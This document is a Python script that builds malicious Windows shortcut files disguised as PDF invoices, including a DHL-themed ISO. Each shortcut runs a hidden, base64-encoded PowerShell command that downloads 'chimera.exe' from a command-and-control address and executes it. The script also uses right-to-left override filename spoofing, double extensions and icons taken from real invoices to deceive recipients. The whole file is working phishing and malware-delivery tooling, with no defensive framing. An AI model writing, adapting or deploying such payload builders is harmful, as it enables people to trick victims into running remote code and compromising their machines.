import win32com.client
import base64
import os
import subprocess

C2_IP = "192.168.56.101"  # Change to your Kali IP if different

def create_lnk(target_path, args, icon, filename):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(filename)
    shortcut.Targetpath = target_path
    shortcut.Arguments = args
    shortcut.IconLocation = icon
    shortcut.WorkingDirectory = "%TEMP%"
    shortcut.save()

def generate_all_lnks():
    os.makedirs("example_payloads", exist_ok=True)

    # PowerShell downloader (same for all)
    ps = f'$c=New-Object Net.WebClient;$c.DownloadFile("http://{C2_IP}/chimera.exe","$env:TEMP\\chimera.exe");Start-Process "$env:TEMP\\chimera.exe"'
    enc = base64.b64encode(ps.encode('utf16')[2:]).decode()

    args = f"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {enc}"

    # Variant 1: Classic
    create_lnk("powershell.exe", args, "shell32.dll,3", "example_payloads/Invoice_1128.pdf.lnk")

    # Variant 2: RTLO
    rtlo = "\u202E"
    create_lnk("powershell.exe", args, "shell32.dll,3", f"example_payloads/Invoice_1128{rtlo}fdp.lnk")

    # Variant 3: Real icon (requires real_invoice.pdf)
    if os.path.exists("real_invoice.pdf"):
        subprocess.run('magick convert "real_invoice.pdf[0]" "temp_icon.ico"', shell=True, capture_output=True)
        create_lnk("powershell.exe", args, "temp_icon.ico", "example_payloads/Tax_Invoice_2025.pdf.lnk")
        os.remove("temp_icon.ico") if os.path.exists("temp_icon.ico") else None

    # Variant 4: ISO with autorun (simplified)
    iso_dir = "temp_iso"
    os.makedirs(iso_dir, exist_ok=True)
    open(f"{iso_dir}/Open_Invoice.pdf.lnk", "w").close()
    subprocess.run(f'powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut(\'{iso_dir}\\Open_Invoice.pdf.lnk\');$s.TargetPath=\'powershell.exe\';$s.Arguments=\'-win hid -enc {enc}\';$s.IconLocation=\'shell32.dll,3\';$s.Save()"', shell=True)
    subprocess.run('powershell -Command "Get-ChildItem temp_iso | New-IsoFile -Path example_payloads/DHL_Invoice_1128.iso"', shell=True)
    subprocess.run('rmdir /S /Q temp_iso', shell=True)

    print("[+] All 4 LNK variants created in example_payloads/")

generate_all_lnks()